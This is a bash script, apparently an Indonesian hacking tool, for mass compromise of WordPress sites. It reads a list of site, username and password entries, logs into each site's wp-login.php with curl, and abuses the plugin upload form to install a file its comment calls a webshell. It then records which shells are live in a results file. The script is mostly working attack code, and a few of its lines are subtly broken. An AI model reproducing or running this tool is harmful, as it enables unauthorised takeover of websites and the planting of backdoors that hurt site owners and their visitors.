#!/bin/bash
# coded by Dinar Hamid - Maxteroit.com
hijau="\e[32m"
merah="\e[31m"
putih="\e[39m"
cyan="\e[46m"
# check folder logs
if [ ! -d logs ]
then
    mkdir logs
fi
 
# check folder result
if [ ! -d result ]
then
    mkdir result
fi

login(){
        # before that we grab fucking shit.
        xx=`curl -A 'Mozilla/5.0 (Windows NT 10.0;Win64;x64;) Gecko/2010010 Firefox/75.0' -s -k --url "$url/wp-login.php"`;
        url="echo $1" | sed 's/wp-login.php/wp-admin/g'
        mm=`echo $xx | grep -Po '(?<=id="wp-submit" )(.*?)[^"]*(/>)'`
        uwo=`echo $mm | grep -Po '(?<=value=")(.*?)(")' | tr -d '"'`
        login=`curl -A 'Mozilla/5.0 (Windows NT 10.0;Win64;x64;) Gecko/2010010 Firefox/75.0' -s -c "logs/cok.txt" --url "$1" -H 'Cookie: wordpress_test_cookie=WP+Cookie+check;' -H "Referer: $1" -d "log=$2&pwd=$3&rememberme=forever&wp-submit=$uwo&redirect_to=$url/plugin-install.php?tab=upload&testcookie=1" -L -D -`
    if [[ $login =~ 'wordpress_logged_in' ]]
    then
        printf "$hijau"
        printf "[ $1 ]"
        printf "[ LOGIN ]"
        echo $login
    elif [[ $login  =~ 'Location: $url' ]]
        then
        printf "$hijau"
        printf "[ $1 ] "
        printf "[ LOGIN ] "
        upload $1
    else
        printf "$merah"
        printf "[ $1 ] "
        printf "[ LOGIN ] \n"
    fi
}
upload(){
 
# check lates cookie, if found delete and write new
tahun=`date +%Y`
bulan=`date +%m`
    # let's upload webshell
        url=`echo $1 | sed 's/wp-login.php/wp-admin/g'`
        path=`echo $1 | sed 's/wp-login.php//g'`
        nonce=`curl -A 'Mozilla/5.0 (Windows NT 10.0;Win64;x64;) Gecko/2010010 Firefox/75.0' -s -k -b logs/cok.txt "$url/plugin-install.php?tab=upload" | grep -Po '(?<=_wpnonce" value=")(.*?)[^"]*()'`
        refer=`curl -A 'Mozilla/5.0 (Windows NT 10.0;Win64;x64;) Gecko/2010010 Firefox/75.0' -s -k -b logs/cok.txt "$url/plugin-install.php?tab=upload" | grep -Po '(?<=_wp_http_referer" value=")(.*?)[^"]*()'`
        install=`curl -A 'Mozilla/5.0 (Windows NT 10.0;Win64;x64;) Gecko/2010010 Firefox/75.0' -s -k -b logs/cok.txt "$url/plugin-install.php?tab=upload" | grep -Po '(?<=button" value=")(.*?)[^"]*'`
        upload=`curl -A 'Mozilla/5.0 (Windows NT 10.0;Win64;x64;) Gecko/2010010 Firefox/75.0' -s -k -b logs/cok.txt -F "_wpnonce=$nonce" -F "_wp_http_referer=$refer" -F 'pluginzip=@uploader.php' -F "install-plugin-submit=$install" --url "$url/update.php?action=upload-plugin" -H "Referer: $url/plugin-install.php?tab=upload"`
        check=`curl -A 'Mozilla/5.0 (Windows NT 10.0;Win64;x64;) Gecko/2010010 Firefox/75.0' -s -k "http://$path/wp-content/uploads/$tahun/$bulan/uploader.php"`
        if [[ $check =~ 'Uploader By' ]]
        then
            printf "$hijau"
            printf "[ UPLOADER ] \n"
            echo "$path/wp-content/uploads/$tahun/$bulan/uploader.php">>result/uploader.txt
        elif [[ $check =~ 'error-page' ]]
        then
            printf "$merah"
            printf "[ UPLOADER ERROR DIRECTOR DANIED ]"
            echo "$1">>result/directorydanied.txt
        else
            printf "$merah"
            printf "[ UPLOADER ] \n"
            echo "$1">>result/failedupload.txt
        fi
        rm -rf logs/*.txt
}
read -p "File : " file
sed -i 's/\r//' $file
for url in `cat $file`; do
    domen=$(awk 'BEGIN{split(ARGV[1],url,"#");print url[1]}' $url);
    pepek=$(awk 'BEGIN{split(ARGV[1],url,"#");print url[2]}' $url);
    user=$(awk 'BEGIN{split(ARGV[1],pepek,"@");print pepek[1]}' $pepek);
    pass=$(awk 'BEGIN{split(ARGV[1],pepek,"@");print pepek[2]}' $pepek);
    login $domen $user $pass
done
sed -i 's/\r//' upload.sh
